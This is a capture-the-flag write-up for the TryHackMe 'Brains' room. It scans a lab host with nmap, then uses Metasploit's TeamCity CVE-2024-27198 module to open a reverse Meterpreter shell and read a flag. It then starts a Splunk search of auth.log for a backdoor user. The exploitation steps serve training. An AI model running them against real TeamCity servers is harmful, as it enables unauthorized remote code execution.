![Nmap Scan](Theme%20Brains.JPG)
> 🧠 Room: [Brains](https://tryhackme.com/room/brains)  
> 📅 Date: April 6, 2025  
> 🛡️ Goal: Gain reverse shell & capture the flag  
> 🚨 CVE used: CVE-2024-27198

# RED exploit the server! 
# 1. What is the content of flag.txt in the user's home folder?

<Details>
      
# 1. First Step: run in the Terminal "nmap -p- *Target_IP_Address*

```bash
nmap -p- 10.10.252.192
````
1. "nmap" -> The network scanner tool
2. "-p-"  -> Scans all ports (from 1 to 65535). By default, Nmap scans only the top 1000 most common ports.
3. "Target_IP_Address" -> The IP address of the target — in the case of the Brains room
      
![Nmap Scan](Brain%20Room%20Nmap%20scan.JPG)
   
# What ports are open and why they matter: 
   1. 22/tcp → ssh (This port is used for Secure Shell (SSH) — remote access to the machine via terminal.)
   2. 80/tcp → HTTP (This is the default HTTP port, used to serve websites.)
   3. 50000/tcp → ibm-db2 (detected by default) This is not a common service for this port. In this specific room (Brains), this port is hosting a TeamCity server, vulnerable to CVE-2024-27198.
   
# Run a targeted service/version scan for PORT 50000 "nmap -sV -p 50000 <Target_IP_Address>"
   ```bash
   nmap -sV -p 50000 10.10.252.192
   ```
   
# 2. Second Step: What port should we investigate further + Using Metasploit (msfconsole) to Exploit the TeamCity Vulnerability
   
   *The most interesting one here is Port 50000: even though it's labeled ibm-db2, we know now it runs TeamCity, which is vulnerable to authentication bypass and remote code execution (RCE).*
   ```bash
   msfconsole
   ```
   1. "msfconsole" -> This launches the Metasploit interface.
   
   ```bash
   search teamcity
   ```
   1. "search teamcity" -> This will list available exploit modules related to TeamCity
   *Look for one like: exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198*
   
#  Use the module:
   ```bash
   use exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198
   ```
# After loading an exploit module in Metasploit, you should always run: 
   ```bash
   options
   ```
   1. "options" -> This command shows you all the configurable parameters for the selected module
      
   ![Nmap Scan](Brain%20Room%20exploit%20run.JPG)
   
   *We need to set the correct options before running the exploit.*
   ```bash
   set RHOSTS 10.10.252.192     # Target IP address
   set RPORT 50000              # Target port where TeamCity is running
   ```
   *Once all the necessary parameters (like RHOSTS, RPORT) are configured and verified using the options command, it's time to execute the exploit*
   ```bash
   run   #or exploit
   ```
# Expected Output:
   *If the target is vulnerable and the configuration is correct, you should see output similar to this:*
   ```bash
   [*] Started reverse TCP handler on 10.10.X.X:4444
   [*] Sending stage (57971 bytes) to 10.10.X.X
   [*] Meterpreter session 1 opened ...
   ```
   *This confirms that you now have a meterpreter shell on the target machine!*
   
# Now That We Are in Meterpreter...Navigate the file system
   ```bash
   cd /home/cd ubuntu
   ls
   ```
   *Once you find it, read its contents*
   ```bash
   cat flag.txt
   ```
   ![Nmap Scan](Brain%20Room%20flag.JPG)
   
# ✅ CONGRATULATIONS!!! Now we have the first FLAG
# For ethical and platform policy reasons, I cannot display the actual contents of the flag.txt file
   *Instead, here is a simulated example of what the output would look like:*
   
   ```bash
   meterpreter > cat flag.txt
   THM{redacted_for_policy}
   ```
   </Details>

# BLUE lets investigate!
# 1. What is the name of the backdoor user which was created on the server after exploitation?
<Details>
   
# 1. First Step: Access the Web Application
   *Once the target machine is deployed, open your web browser and navigate to the following address:*
   ```bash
   10.10.249.14:8000
   ```
   1. "10.10.249.14" -> The target machine's IP address
   2. "8000" -> The port number
   
# 2. Second Step:  Access Search & Reporting
   
   *In the left-hand panel, you can see a list of installed apps within Splunk; Click on Search & Reporting*
   
   ![Nmap Scan](Brain%20Room%20Web%20search.JPG)
   
# Search for the Backdoor User
   *Now that we are inside Search & Reporting, it's time to use Splunk’s powerful query system to investigate the logs and answer the first question*
   *We're going to search inside the authentication logs (auth.log) for entries related to the creation of new users.*
   
   ```bash
   source="/var/log/auth.log" *new user* #Set Time Range to “All time”
   ```
   ![Nmap Scan](Brain%20Room%20F1.JPG)
